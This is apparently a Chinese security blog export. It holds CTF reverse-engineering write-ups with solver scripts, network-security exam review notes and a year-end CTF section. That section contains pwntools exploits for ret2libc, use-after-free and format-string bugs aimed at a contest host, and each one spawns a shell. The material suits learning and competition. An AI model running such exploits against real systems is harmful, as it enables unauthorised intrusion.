接下来看主函数里check上面的部分，看到sub_409070()实际上是一个scanf，而dword_4A1B60是我们的输入，也就是最后的flag，中间对输入进行处理以后才得到“884226886224488”这个字符串。 在里面翻可以翻到一个sub_400B58()，猜测是base64换表编码。 于是尝试写脚本编码。 import base64b64table=\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"mytable=\"\"offset=-18for i in range(len(b64table)): mytable+=b64table[(i+offset)%len(b64table)]text=\"884226886224488\".encode()cipher=base64.b64encode(text).decode().translate(str.maketrans(b64table,mytable))print(cipher) 试试能不能过check。 wsl运行：（要装qemu才能执行，毕竟特殊架构。 cp $(which qemu-mips) ..&#x2F;qemu-mips -L . .&#x2F;puzzle 执行mips程序，输入脚本中解出的字符串，发现成功了，get flag。 flag{8xOi6R2k8xOk6R2i7xOm} aRmarm架构。 照例通过字符串回溯找到主函数。 v1是key，v9是输入的flag，对输入的限制就是长度为42且头尾是“flag{”和“}”。 动态调一下可以发现，sub_27770()这个函数实际上是把unk_723A0数组里的42个数据复制到v8里。 .&#x2F;qemu-arm -L .&#x2F; -g 12345 .&#x2F;aRm （Debugger选Remote GDB debugger，把端口号填上就好，其余配置具体见RE套路 - 关于使用IDA 7.0前端进行的动态调试 | c10udlnk_Log中调试elf部分。 现在我们未知的数就剩v5和v6了，v5要看sub_1714C()的输出，v6这里相当于是42条42元一次方程组（输入未知的情况下）。 而sub_105B4()是输出42个结果，于是可以知道只要输出了output.txt里的42个数就是正确的flag了。 由于前面有一个sub_169AC(key)，这边又是一个无参的sub_1714C()+1，于是猜测是srand(seed)和rand()。 为了证明猜测，多次运行程序输入同一个key和相同/不同的flag，发现每一次的v5是一样的，结合rand()的伪随机性，确定这就是随机函数。 由于key只有一字节（0~255），干脆直接爆破。把output.txt的数据读入，用sympy库解方程，只要第一个解x0等于ord(&#39;f&#39;)^v8[0]=102^0xA0=198，就说明这个key有极大可能性是正确的key。 当然，在此之前，我们得先知道每一次的v5（即方程的系数）是多少。 于是hook函数，在v5生成之后复用程序原来就有的print函数及格式符，把每次生成的v5都打印出来。 还记得有个函数是可以输出八位十六进制数的吧，就是那个sub_105B4()，我们可以用这里面的printf，然后把调用这个函数的地方nop掉（目标要明确，现在是为了爆破key，没必要管程序的正常性hahah）。 本来是想自己堆个调用printf出来的，不知道为什么keypatch对LDR R0, =a08x解释不了，于是只好绕个小路了。 转到汇编窗口，记一下这里的loc，等会要跳过来的。 看回去原来二重循环里出v5那个地方 这几条语句的意思就是f5里面的那行v5 = (unsigned __int8)(sub_1714C() + 1);，我们从再下一行开始改。 注意可以改的范围在蓝框这里，这是我们不需要的v6[j] += (unsigned __int8)v9[k] * v5;，在这个范围里可以尽情修改，剩下的nop掉。 用keypatch直接输入汇编，patch后面的语句为 （其实就是改了一行B loc_105D4，剩下的直接Fill with NOPs就好） 接下来去往loc_105D4，改造一下。 我们知道，现在R3寄存器里实际上存的是v5的值，我们调用printf直接输出R3的值就能达成目标。 在ARM汇编里，函数传参用R0、R1……所以我们这里给R1一个R3的值就好。 这里本来就是MOV R1, R3不用改，所以直接把前面nop掉。 因为v5那里是取(unsigned __int8)，所以把这里改一下，把”%08x”改成”%02x”，就是出来的v5。 别忘了后面还要跳回去，找到地址： patch： 记得把调用sub_105B4()的地方也nop掉。 最后把patch的字节保存一下。 运行测试一下，有： ok，hook成功，开始爆破。 import pexpectfrom sympy import *data=[]with open('output.txt','r') as f: tmp=f.read().split('\\r\\n') data=[int(x,16) for x in tmp]src=[0xA0, 0xE4, 0xBA, 0xFB, 0x10, 0xDD, 0xAC, 0x65, 0x8D, 0x0B, 0x57, 0x1A, 0xE4, 0x28, 0x96, 0xB3, 0x0C, 0x79, 0x4D, 0x80, 0x90, 0x99, 0x58, 0xFE, 0x50, 0xD3, 0xF9, 0x3C, 0x0F, 0xC1, 0xE3, 0xA6, 0x39, 0xC3, 0x28, 0x75, 0xF8, 0xC9, 0xC8, 0xCD, 0x78, 0x26]flag='flag&#123;000000000000000000000000000000000000&#125;'var=[]for num in range(42): exec(\"x\"+str(num)+\"=Symbol('x'+str(num))\") var.append(\"x\"+str(num)) #创建42个变量x0~x41for i in range(256): r=pexpect.spawn('./qemu-arm -L ./ ./aRm_getRand') r.sendline(str(i)) r.sendline(flag) r.readline() r.readline() rand=[] for j in range(42*42): s=r.readline() rand.append(int(str(s)[2:-5],16)) r.wait() exper=[] for j in range(42): anEx=\"\" for k in range(42): anEx+=str(rand[j*42+k])+\"*\"+var[k]+\"+\" anEx=anEx[:-1]+\"-\"+str(data[j]) exper.append(anEx) res=solve(exper,var) print(str(i)+\": \") print(res.values()) 爆破得到： 可知key是82，而v9在xor以后的数组也爆出来了，简单xor得flag： arr=[0xA0, 0xE4, 0xBA, 0xFB, 0x10, 0xDD, 0xAC, 0x65, 0x8D, 0x0B, 0x57, 0x1A, 0xE4, 0x28, 0x96, 0xB3, 0x0C, 0x79, 0x4D, 0x80, 0x90, 0x99, 0x58, 0xFE, 0x50, 0xD3, 0xF9, 0x3C, 0x0F, 0xC1, 0xE3, 0xA6, 0x39, 0xC3, 0x28, 0x75, 0xF8, 0xC9, 0xC8, 0xCD, 0x78, 0x26]x=[198, 136, 219, 156, 107, 228, 152, 7, 239, 63, 97, 127, 134, 5, 247, 131, 109, 75, 96, 180, 241, 173, 57, 211, 49, 224, 157, 9, 34, 243, 129, 199, 1, 244, 31, 17, 157, 171, 252, 249, 64, 91]flag=\"\"for i in range(42): flag+=chr(x[i]^arr[i])print(flag) flag{94bb46eb-a0a2-4a4a-a3d5-2ba877deb448} pearm架构，没环境调不动，只能硬看了XD。这题有好多奇怪的函数，而且通过伪代码跟的话就能看到函数套函数套函数……所以基本靠猜出来的（ 继续通过字符串回溯找主函数。 根据参数猜测，sub_1400023C8()是strcmp()的作用，我们需要让v9=”KIMLXDWRZXTHXTHQTXTXHZWC”。 再往上走，sub_1400015B0这个函数调用了v9，于是跟进去看功能。 感觉是某种加密，以相邻的两字符为一组，对这两个字符做相同的操作，再做后续处理。 跟进sub_1400012B8()里看，可以看到大概是一个搜索的过程 如果不等于-1就说明在表中找到了这个元素，然后返回一个索引（？ 再往下看好像就看不太懂了，然后就是玄学的猜猜猜= = 回去看string可以看到一个这个，猜测是密钥表之类的？ 往上回溯也看不到什么线索，不过可以发现这25个数字刚好没有相同的。 现在总结一下这个古典加密算法的特点，大概是两个为一组处理+已定义的密钥表（即不是通过输入生成的）5*5+处理时用到索引。 很久很久以前想写某对cp的AU同人时想把ctf元素混进去，就看了很多简单又奇奇怪怪的编码/古典密码（现代密码太学术了XD），没想到现在有用武之地了（手动狗头。 然后翻到了一个符合这个特点的密码，Playfair Cipher： 不同的是密码表是直接给出的，不过加密流程再对回ida里的反编译感觉挺像的，于是果断试试。 按照Playfair Cipher的加解密流程写出脚本： def getIndex(c): for i in range(len(key)): if key[i].find(c)!=-1: return i,key[i].find(c)letter_list=\"ABCDEFGHJKLMNOPQRSTUVWXYZ\"key=[\"CREIH\",\"TQGNU\",\"AOVXL\",\"DZKYM\",\"PBWFS\"]cipher=\"KIMLXDWRZXTHXTHQTXTXHZWC\"text=\"\"for i in range(0,len(cipher),2): j=i+1 x1,y1=getIndex(cipher[i]) x2,y2=getIndex(cipher[j]) if x1==x2: text+=key[x1][(y1+1)%5]+key[x2][(y2+1)%5] elif y1==y2: text+=key[(x1+1)%5][y1]+key[(x2+1)%5][y2] else: text+=key[x1][y2]+key[x2][y1] i+=2print(text) 走一遍脚本解密可以得到： YES MAYBE YOU CAN RUN AN ARM PE No, I can’t 😦 看起来能读的通，成功get flag。 flag{YESMAYBEYOUCANRUNANARMPE}","categories":[{"name":"CTF","slug":"CTF","permalink":"https://github.com/gha01un/gha01un.github.io/categories/CTF/"}],"tags":[{"name":"RE","slug":"RE","permalink":"https://github.com/gha01un/gha01un.github.io/tags/RE/"}],"author":"H1un"},{"title":"网络安全复习","slug":"网络安全复习","date":"2021-01-01T09:09:55.948Z","updated":"2021-01-05T11:38:56.286Z","comments":true,"path":"2021/01/01/网络安全复习/","link":"","permalink":"https://github.com/gha01un/gha01un.github.io/2021/01/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%8D%E4%B9%A0/","excerpt":"网络安全复习","text":"网络安全复习 第一章 概论网络安全主要威胁 特洛伊木马，黑客攻击，后门，计算机病毒，拒绝服务攻击，内外部泄密，蠕虫，逻辑炸弹，信息丢失篡改销毁。 网络安全的三个基本属性 C I A (扩展5个) 机密性，完整性，可用性，可认证与可信任性，不可抵赖性，可说明性，可审计性，隐私性 黑客攻击类型：从安全属性上分类:阻断攻击，截取攻击，篡改攻击，重放攻击，伪造攻击。从攻击方式分类：主动攻击:伪装，回答，修改报文，拒绝服务。 被动攻击:报文内容泄露，通信分析。 第二章 网络攻击流程黑客攻击流程踩点 —&gt; 扫描 —&gt; 查点 —&gt; 访问/拒绝服务 —&gt; 提权 —&gt; 窃取信息 —&gt; 淹没踪迹 —&gt; 创建后门 扫描基本步骤确定目标系统是否真实存在，确定目标系统上那些服务正在运行或监听，探查操作系统。 nmap使用技巧常用命令： -sP ：进行ping扫描-sn: Ping Scan - disable port scan #ping探测扫描主机， 不进行端口扫描 （测试过对方主机把icmp包都丢弃掉，依然能检测到对方开机状态）-sA （发送tcp的ack包进行探测，可以探测主机是否存活）SYN扫描(半开) -sS ：向目标端送SYN数据包，返回SYN/ACK数据包，可以断定该端口处于监听状态，返回RST/ACK数据包，通常表明该端口不在监听状态，然后，扫描者送出一个RST/ACK数据包(使通信双方永远不会建立一条完整连接)优点:更隐秘，目标系统一般不会将其记入日志。缺点:半开连接过多时，会形成一种拒绝服务条件而引起对方的警觉TCP连接扫描 -sT：3次握手方式tcp的扫描 #效率低，速度慢，不需要root 很容易被目标系统察觉-sU：udp端口的扫描 #如果返回ICMP不可达的错误消息，说明端口是关闭的，如果得到正确的适当的回应，说明端口是开放的.udp端口扫描速度比较慢FIN扫描(秘密扫描) -sF：也是tcp的扫描一种，发送一个FIN标志的数据包 如果目标端口关闭，目标系统应该返回一个RST数据包,否则丢弃该包。通常只对UNIX系统的TCP/IP栈有效(Window平台总是返回RST包)。由于不包含TCP三次握手协议的任何部分，所以无法被记录下来，从而比SYN扫描隐蔽FIN数据包能通过监测SYN包的包过滤器(秘密扫描)-sX：圣诞树扫描-sN：空(NULL)扫描-sV：版本检测TCP ACK扫描(nmap -sA):测试防火墙的规则集。判断防火墙是简单的包过滤防火墙;还是高级的、具备数据包过滤功能的状态(stateful) 防火墙不能用来确定端口是否开放或者关闭TCP窗口扫描(nmap -sW) :测试特定目标系统(如AIX和FreeBSD系统).上的端口是否开放、 被过滤一会导致目标系统返回不同的TCP窗口长度值TCP Ma imon扫描(nmap -sM) : 探测报文改为FIN/ACK外,其原理与TCP FIN扫描一-样;无论端口是否开放，都应响应RST报文。Uriel注意到如果端口开放，许多基于BSD的系统只是丢弃该报文UDP扫描(nmap -sU) : 向目标端口发出UDP数据包如果返回“ICMP port unreachable”出错消息，表明端口关闭。如果没有收到该消息，端口可能开放remark: UDP不要求必须建立一条连接,所以扫描的准确性取决于与目标网络的使用情况和过滤机制有关的许多因素(扫描结果不可靠) 查点对识别出来的服务进行更为充分的探查 · 用户账号名（用于随后的口令猜测攻击） · 错误配置的共享资源（如不安全的文件共享） · 具有已知安全性漏洞的旧版本软件（如存在远程缓冲区溢出的web服务器） 攻击实施分类：破坏性攻击：利用工具发动攻击。入侵性攻击：利用收集到的信息，找到其系统漏洞，然后利用漏洞获取尽可能高的权限 主要阶段：预攻击探测：为进一步入侵提供有用信息。口令破解与提升权限。实施攻击：缓冲区溢出、拒绝服务、后门、木马、病毒 攻击善后：留后门：长时间地保留和巩固对系统的控制权。隐藏踪迹：删除日志文件，更改日志文件，替换系统程序。 渗透测试一种通过模拟的攻击者的技术与方法，挫败目标系统的安全控制措施 并取得访问控制权的安全测试方法 分类： 白盒测试：拥有组织机构的内部知识的情况下进行的渗透测试 灰盒测试：拥有一部分内部知识的情况下进行的渗透测试 黑盒测试：模拟一个对组织机构一无所知的攻击者进行的渗透测试 步骤（七步） 前期交互阶段：确定渗透测试范围，目标，限制条件以及服务合同细节。情报搜集阶段：获取目标网络拓扑，系统配置，安全防御措施等信息。威胁建模阶段：针对获取的信息进行威胁建模和攻击规划。漏洞分析阶段：总和汇总的情报信息，从漏扫结果，服务查点信息等找出可实施攻击的点。渗透攻击阶段：利用找出的漏洞入侵系统，获取访问权限。后渗透攻击阶段：根据目标组织经营模式，保护资产形式等自主设计攻击目标。实施能造成重要业务影响的攻击报告阶段：凝聚所有阶段的关键情报信息，发现的系统漏洞，成功的渗透攻击过程，同时分析修补与升级方案 第四章 口令破解暴力破解:穷举，速度慢。 字典攻击：根据用户信息建立起一个用户可能使用的口令表文件，速度快。 组合攻击：在字典列表的基础上增加几个字母或数字进行攻击。 社会工程学：偷窥，网络嗅探，搜索垃圾箱，重放。 windows口令文件1.安全账户管理器SAM机制。 C:\\Windows\\System32\\Config\\SAM 2.SAM文件: 含有本地系统或坐在控制域上所有用户名和口令的HASH值。 密码系统：/etc/passwd: 包含了用户名、用户的真实姓名、标 识信息以及每个用户的基本信息，各个域之间用”:” 隔开/etc/shadow: 影子密码文件，包含了加密过的密码以 及密码失效时间 /etc/group：列出了计算机上所有的组/etc/gshadow：计算机上所有组的群组影子密码文件 第五章 欺骗攻击 欺骗：冒充身份通过认证以骗取信任的攻击方式攻击者针对认证机制的缺陷，将自己伪装成可信任方， 从而与受害者交流，以获取信息或者展开进一步攻击 常见的欺骗攻击ip欺骗ARP欺骗邮箱欺骗DNS欺骗WEB欺骗 IP欺骗 IP协议：非面向连接，两台计算机的信任连接主要依 靠双方的IP地址 IP欺骗的方式： 简单的IP地址更改:攻击者将一台计算机的IP地址修改为其它主机的地址， 以伪装冒充其它机器源路由攻击：保证数据包始终会经 过一条经定的途径，而攻击者机器在该途径中TCP会话劫持:接管现存动过程，即攻击者可以替代原来的合法用户，同时监视并掌 握会话内容 TCP会话劫持(Session Hijack): 接管现存动态会话的过程，即攻击者可以替代原来的合法用户，同时监视并掌握会话内容。会话劫持结合了嗅探及欺骗技术，会话劫持一般伴随着拒绝服务DoS，且不依赖于操作系统 1.发现攻击目标 ①目标是一个准予TCP 会话连接（例如Telnet和FTP等）的服务器②能否检测数据流2.确认动态会话3.猜测序列号 ①通过嗅探或者ARP欺骗，先发现目标机正在使用 的序列号，再根据序列号机制，可以猜测出下一 对SEQ/ACK序列号② 同时，攻击者若以某种方法扰乱客户主机的SEQ/ACK，服务器将不再相信客户主机正确的数据包，从而可以伪装为客户主机，使用正确的 SEQ/ACK序列号，现在攻击主机就可以与服务器进 行连接，这样就抢劫一个会话连接。4.使客户主机下线 对其进行拒绝服务攻击5.接管会话 ①持续向服务器发送数据包并且接管整个会话 ②创立账户留下后门 TCP会话劫持的危害 1.就其实现原理而言，任何使用Internet进行通信 的主机都有可能受到这种攻击 2产生了简单适用的会话劫持攻击软件，技术门槛的 降低导致了很多“少年攻击者”的诞生. 原因：一个最主要的原因就是它并不依赖于操作系统，另一个原因就是它可以被用来进行积极的攻击，通过攻击行为可以获得进入系统的可能。 第六章 web攻击SQL注入1.原理 利用Web应用对后数据库查询语句处理存在的安全漏洞，攻击者提交一段精心构造的数据库查询代码， 根据返回的结果，获得他想得知的数据。 2.注入分类普通注入：利用union查询等来进行注入。报错注入：根据报错信息进行注入。盲注：bool盲注，时间盲注。 3.注入位置只要执行了了数据库查询语句的地方都可能存在注入。 4.sql注入防范①使用预编译语句，绑定变量②对用户提交的数据和输入参数进行严格的过滤③摒弃动态 SQL 语句，改用存储过程来访问和操作数据④使用安全函数⑤最小权限原则 XSS攻击者往Web页面里插入恶意html代码，当用户浏览该网页时， 嵌入其中的恶意代码被执行，达到特殊目的。一旦得手，黑客可以盗取用户帐户，修改用户设置，盗取 /污染cookie，做虚假广告，查看主机信息等。 1.跨站脚本攻击发起条件 Web服务器允许用户在表格或编辑框中输入不相关的字符。 Web服务器存储并允许把用户输入显示在返回给终端用户的页面上，而没有去除非法字符或者重新进行编码。 2.攻击实现条件 需要存在跨站脚本漏洞的web应用程序 需要用户点击连接或者访问某一页面 3.分类反射型XSS（XSS Reflection,非持久性的XSS）：简单的将用户输入数据“反射”给浏览器，黑客需要诱导用户点击一个恶意链接。存储式XSS（Stored XSS）：攻击脚本永久存储在目标服务器数据库或者文件中，比如黑客写下一篇含有恶意JavaScript代码的博客文章。DOM型XSS：利用 DOM（文档解析功能）发动攻击。 4.防御用户：教育为主 Web应用开发者 对所有用户提交内容进行可靠的输入验证。 保护所有敏感的功能，以防被机器人自动执行或者被第三方网站所执行。 web攻击防御1.简单性:主机系统越简单，其安全性就越好。最好把不必要的服 务从服务器上卸载掉。 2.超级用户权限：尽量不用超级用户来维护系统。 3.本地和远程访问控制：访问控制是用来指定哪些用户可以访问系统的特定数据、 目录或功能。应该实现一套有效的身份验证机制，并包含用户的日志记录。 4.审计和可审计性:主要指平时对记录进行审计，在系统生成的大量审计记录 中查找可疑数据，查找攻击者或恶意程序的踪迹. 5.恢复：配置实时或增量备份策略是非常必要的，在紧急关头可以使得服务器的关键数据得以保存，从而可以迅速恢复服务以减少损失，同时便于事后取证的进行，以追查入侵者。 第七章 缓冲区溢出什么是缓冲区: 包含相同数据类型实例的一个连续的计算机内存块， 是程序运行期间在内存中分配的一个连续区域，用于保存包括字符数组在内的各种数据类型。 缓冲区溢出（Buffer Overflow）：向固定长度的缓冲区中写入超出其预定长度的内容，造成缓冲区数据溢出，从而覆盖缓冲区周围的内存空间。 堆和栈的区别:分配和管理方式不同 堆:动态分配，其空间的分配和释放都由程序员控制 栈:由编译器自动管理产生碎片不同 堆:频繁的new()/delete()或malloc()/free()势必会造成内存空间的不连续，造成大量碎片，使程序效率降低 栈:先进后出的队列，永远不可能有一个内存块从栈中间弹出生长方向不同 堆:向着内存地址增加的方向增长 栈:向着内存地址减小的方向增长，由内存的高地址向低地址方向增长 黑客借此精心构造填充数据，可以修改内存中变量的 值，导致原有流程改变，甚至可以劫持进程，执行恶意代码，最终获取系统控制权\\。 其他攻击类型相比，缓冲区溢出攻击： 技术性强破坏力大隐蔽性强 缓冲区溢出原理栈溢出 PE文件代码段中包含的机器码会装入内存的代码区(.text)。发生函数调用时，函数的调用关系等信息会动态保存到内存的栈区。如果需要动态分配内存，则在内存的堆区分配合适的区域 堆溢出 C使用malloc()/free()，C++使用new()/delete()函数实现内存的动态分配和回收 BSS溢出 .bss段存放全局和静态的未初始化变量，其分配比较简单，变量之间连续存放 如下定义的两个字符数组位于BSS段:static char buf1[16]，buf2[16];向buf2中写入16个字符A后再往buf1中写入24个.B，由于变量连续存放，buf1溢出后，就会覆盖buf2的值 利用:改写BSS中的指针或函数指针等，改变程序原先的执行流程，使指针跳转到特定的内存地址并执行指定操作 格式化串溢出 在输出函数对输出格式进行解析时产生的漏洞 整数溢出 当计算结果超过了规定的长度后，编译器一般会删除溢出的高位部分 防御缓冲区溢出的真正原因在于编程语言缺乏类型安全，程序缺少边界检查。 1.系统管理上的防范策略 1.1关闭不需要的特权程序 1.2及时给程序漏洞打补丁 2.软件开发过程中的防范策略 2.1编写正确的代码 2.2数组边界检查 2.3改进语言函数库 2.4程序指针完整性检查 2.5栈保护机制 3.软件运行过程中的防范措施 3.1缓冲区不可执行 3.2地址空间随机化 源码级保护方法 运行期保护方法 阻止攻击代码执行 加强系统防护 第十章 身份认证1.AAA机制：认证 :在做任何动作之前必须要识别动作执行者的真实身份。又称为鉴别、确认。主要是通过标识符鉴别用户身份，防止攻击者假冒合法用户获取访问权限。授权 :当用户身份被确认合法后，赋予该用户进行文件和数据等的操作权限，包括读、写、执行及从属权等。审计(Auditing) :每一一个人都应该为自己所做的操作负责所以在做完事情之后都要留下记录，以便核查责任 2.认证分类 基于口令认证：简单口令认证，基于单向函数的口令认证，一次性口令认证。基于生理特征的认证。基于地址的认证：每个主机存储着可以访问本机的其他主机的账号信息，这样只要确认了对方的主机地址，就可以进行用户验证。 3.常见身份认证技术 基于口令的认证 基于密码学认证 基于令牌的认证 基于生物特征的认证 3.Kerberos认证协议 基于可信第三方（Trusted Third Party，TTP）的认证协议；MIT的雅典娜项目组（Athena Group）开发的认证服务系统，基于对称加密技术。 基本思想（假设）：能正确对信息进行解密的用 户就是合法用户 三个子协议: 认证服务器交换（AS交换）：在客户C和AS间进行 票证授予服务器交换(TGS交换）：在C和TGS间交换 客服服务器认证应用交换(AP交换)：在C和应用服务器S间进行 构成 : 一个完整的 Kerberos 环境包括一个 Kerberos 服务器，一组工作站和一组应用服务器。 第十一章 访问控制访问控制(Access Control)在身份认证的基础上，依据授权对提出的资源访问请求加以控制。对机密性、完整性起直接作用;是针对越权使用资源的防御措施 访问控制策略模型:自主访问控制:指一个实体可以被授权按照自己的意志使另一个实体能够访问某些资源 强制型访问控制:通过比较具有安全许可的安全标记来控制访问 基于角色的访问控制：基于用户在系统中所属的角色和针对各种角色设定的访问权限来控制访问 基于属性的访问控制：基于用户，被访问资源以及当前环境条件控制访问。 访问控制机制包括：访问控制列表ACL，能力表，锁与钥匙，保护环 计算机安全形式化模型：机密性安全策略Bell-L aPadula模型，完整性安全策略Biba模型 第十二章 防火墙基本原理1.防火墙是位于两个网络间的实施网间访问控制的组件的集合,防火墙通常是单独的计算机、路由器或专有硬件设备， 充当访问网络的唯一入口点。 内网和外网的所有网络数据流必 须经过防火墙.只有符合安全策略的数据流才能通过防火墙.防火墙自身对渗透(penetration) 是免疫的. 2.处理方式 ACCEPT:允许数据包或信息通过 Reject:拒绝数据包或信息通过，并且通知信息源该信息被进制 Drop:直接将数据包或信息丢弃，不通知信息源 3.基本策略默认允许原则：没有明确禁止的都是允许的。默认拒绝原则：没有明确允许的都是禁止的 4.主要功能网络安全的屏障。强化网络安全策略。对网络存取和访问进行监控审计。防止内部信息的外泄 防火墙的分类1.包过滤防火墙 工作在网络层和传输层。设定访问控制列表ACL（Access Control List），检查所有通 过的数据包。 发展：静态包过滤防火墙，动态包过滤防火墙（状态检测）。 优点：逻辑简单，价格便宜，对网络性能的影响较小，有较强的透明性。与应用层无关。缺点：需要对IP、TCP、UDP等协议有深入了解，否则容易出现因配置不当而带来问题。过滤有限，不能充分满足各种安全要求。不能彻底防止地址欺骗。 2.代理服务器 应用层代理/代理服务器通过在主机上运行代理服务程 序，直接对特定的应用层进行服务，因此也称应用型防火墙。 优点：1.易于配置，界面友好。2.不允许内外网主机的直接链接。3.提供详细日志。4.可以隐藏用户内部的IP，可以给单个用户授权缺点：1.速度相对慢。2.需要为不同的网络服务建立专门的代理服务。 3.电路级网关 监控受信任的客户或服务器与不受信任的主机间的TCP握手信息，以决定会话是否合法。 网络地址转换（NAT）：属接入广域网技术，一种将私有IP地址转化为合法广域网IP地址的转换技术，被广泛应用。 NAT分类：静态NAT，动态NAT，端口转换NAPT。 4.混合型防火墙 防火墙的配置方案1.屏蔽路由器：最简单的防火墙配置，直接在内网和 外网之间加装一个包过滤路由器或者应用网关 2.双宿主机模式：采用主机替代路由器执行安全控制功能， 类似于包过滤防火墙，是外部网络用户进入内部网络的唯一通道。 特点：主机的路由功能被禁止，两个网络间的通信通过双宿主机完成。 弱点：一但堡垒机被攻破，可任意访问内网。 3.屏蔽主机模式：包过滤路由器连接外网，堡垒主机安装在内网。 4.屏蔽子网模式：较流行的一种结构，采用两个包过滤路由器和一个堡垒主机，在内外网络之间建立一个被隔离的子网，称为DMZ 协商协议的参数交换公共密钥对双方进行认证在交换后对密钥进行管理","categories":[{"name":"Study","slug":"Study","permalink":"https://github.com/gha01un/gha01un.github.io/categories/Study/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://github.com/gha01un/gha01un.github.io/tags/AI/"}],"author":"H1un"},{"title":"岁末赛","slug":"岁末赛","date":"2020-12-26T16:02:38.471Z","updated":"2021-01-05T11:35:24.840Z","comments":true,"path":"2020/12/27/岁末赛/","link":"","permalink":"https://github.com/gha01un/gha01un.github.io/2020/12/27/%E5%B2%81%E6%9C%AB%E8%B5%9B/","excerpt":"岁末赛","text":"岁末赛 pwn2from pwn import *# from LibcSearcher import *i=remote('219.219.61.234',10001)#sh=process('./pwn2')elf=ELF('./pwn2')addr=0x08048753sm=elf.got['__libc_start_main']p_t=elf.plt['puts']payload1='\\x00'*7 +'\\xff'i.sendline(payload1)i.recvuntil(\"you_really_know_random_haha\\n\")payload2=(0x6c+4)*'a'+p32(p_t)+p32(addr)+p32(sm)i.sendline(payload2)s_addr=u32(i.recv(4))info(hex(s_addr))# libc=LibcSearcher(\"__libc_start_main\",s_addr)libc = ELF('libc6-i386_2.23-0ubuntu11.2_amd64.so')A=s_addr-libc.sym[\"__libc_start_main\"]info(hex(A))y_addr=A+libc.sym['system']# binsh_addr=A+libc.dump('str_bin_sh')binsh_addr = A + 0x15910b#payload1='\\x00'*7+'\\xff'#i.sendline(payload1)#i.recvuntil(\"you_really_know_random_haha\")payload2=(0x6c+4)*'a'+p32(y_addr)+p32(addr)+p32(binsh_addr)i.sendline(payload2)i.interactive() pwn3from pwn import *#sh = process(\"./pwn3\")sh = remote('219.219.61.234','10002')context.log_level = 'info'def create(size,content): sh.recv() sh.sendline(\"1\") sh.recv() sh.sendline(str(size)) sh.recv() sh.sendline(str(content))def delete(index): sh.recv() sh.sendline(\"2\") sh.recv() sh.sendline(str(index))def myprint(index): sh.recv() sh.sendline(\"3\") sh.recv() sh.sendline(str(index))create(8,12 * 'a')create(16,\"bbb\")delete(\"0\")delete(\"1 \")sh.recv()sh.sendline(\"1\")sh.recv()sh.sendline(\"8\")sh.recv()sh.sendline(p32(0x08048986))myprint(\"0\")#log.success(sh.recv())sh.interactive() pwn4from pwn import *sh = process('./pwn4')sh = remote('219.219.61.234','10003')context.log_level='debug'context(arch='amd64',os='linux')libc = ELF('libc-2.23.so')elf = ELF('./pwn4')puts_got = elf.got['printf']sh.recv()sh.sendline('a')sh.recv()sh.sendline('3')key = '3xpL0r3R'sh.recv()sh.sendline(str(key))payload = 'aaaa%77$p'#6sh.sendline(payload)sh.recvuntil('aaaa0x')libc_base = int(int(sh.recv(12),16) - 0x20840)log.success(hex(libc_base))#gdb.attach(sh)puts_addr = libc_base + libc.sym['puts']log.success(hex(puts_addr))gad_get = [0x45226,0x4527a,0xf0364,0xf1207]one_addr = libc_base + gad_get[0]log.success(hex(one_addr))#gdb.attach(sh)payload = fmtstr_payload(6, &#123;puts_got:one_addr&#125;)sh.sendline(payload)sh.interactive() zzzz3333333z3 不知道为啥我的z3模块出了问题，最后用sympy跑出来的 from z3 import *a1=Int('a1')a1[1]=Int('a1[1]')a1[2]=Int('a1[2]')a1[3]=Int('a1[3]')a1[4]=Int('a1[4]')a1[5]=Int('a1[5]')a1[6]=Int('a1[6]')a1[7]=Int('a1[7]')a1[8]=Int('a1[8]')a1[9]=Int('a1[9]')a1[10]=Int('a1[10]')a1[11]=Int('a1[11]')a1[12]=Int('a1[12]')a1[13]=Int('a1[13]')a1[14]=Int('a1[14]')a1[15]=Int('a1[15]')a1[16]=Int('a1[16]')a1[17]=Int('a1[17]')a1[18]=Int('a1[18]')a1[19]=Int('a1[19]')a1[20]=Int('a1[20]')a1[21]=Int('a1[21]')a1[22]=Int('a1[22]')a1[23]=Int('a1[23]')a1[24]=Int('a1[24]')a1[25]=Int('a1[25]')a1[26]=Int('a1[26]')a1[27]=Int('a1[27]')a1[28]=Int('a1[28]')a1[29]=Int('a1[29]')a1[30]=Int('a1[30]')a1[31]=Int('a1[31]')a1[32]=Int('a1[32]')a1[33]=Int('a1[33]')a1[34]=Int('a1[34]')a1[35]=Int('a1[35]')a1[36]=Int('a1[36]')a1[37]=Int('a1[37]')s = Solver()s.add(48 * a1[7] + (a1[5] &lt;&lt; 6) + 4 * a1[4] + 59 * a1[1] + 85 *a1 + 76 * a1[2] + 65 * a1[3] + 50 * a1[6] + 11 * a1[8] + 66 * a1[9] == 44858 ) s.add( 96 * a1[7]+ 6 * a1[6] + 97 * a1[4] + 71 * a1[1] + 87 * a1 + 26 * a1[2] + 80 * a1[3] + 100 * a1[5] + 20 * a1[8] + 46 * a1[9] == 54177 ) s.add ( 82 * a1[8] + 29 * a1[7] + 54 * a1[4] + 22 * a1[1] + 27 * a1 + 92 * a1[2] + 9 * a1[3] + 35 * a1[5] + 36 * a1[6] + 90 * a1[9] == 40412 ) s.add ( 60 * a1[7] + 31 * a1[5] + 47 * a1 + 32 * a1[1] + 55 * a1[2] + 17 * a1[3] + 70 * a1[4] + 10 * a1[6] + 34 * a1[8] + 25 * a1[9] == 32362 ) s.add( 53 * a1[7] + 89 * a1[6] + 13 * a1[4] + 72 * a1[3] + 49 * a1[1] + 18 * a1 + 61 * a1[2] + 3 * a1[5] + 67 * a1[8] + 15 * a1[9] == 37176 ) s.add ( 78 * a1[8] + 38 * a1[5] + 69 * a1[2] + 77 * a1 + 16 * a1[1] + 99 * a1[3] + 33 * a1[4] + 8 * a1[6] + 5 * a1[7] + 91 * a1[9] == 42742 ) s.add ( 62 * a1[8] + 52 * a1[7] + 58 * a1[2] + 45 * a1[1] + 40 * a1 + 51 * a1[3] + 24 * a1[4] + 95 * a1[5] + 19 * a1[6] + 94 * a1[9] == 47553 ) s.add ( 28 * a1[8] + 63 * a1[7] + 12 * a1[6] + 57 * a1[4] + 30 * a1[3] + 42 * a1[2] + a1[1] + 88 * a1 + 83 * a1[5] + 73 * a1[9] == 41059 ) s.add ( 41 * a1[8] + 93 * a1[6] + 68 * a1[5] + 98 * a1[2] + 75 * a1[1] + 39 * a1 + 86 * a1[3] + 14 * a1[4] + 23 * a1[7] + 7 * a1[9] == 43919 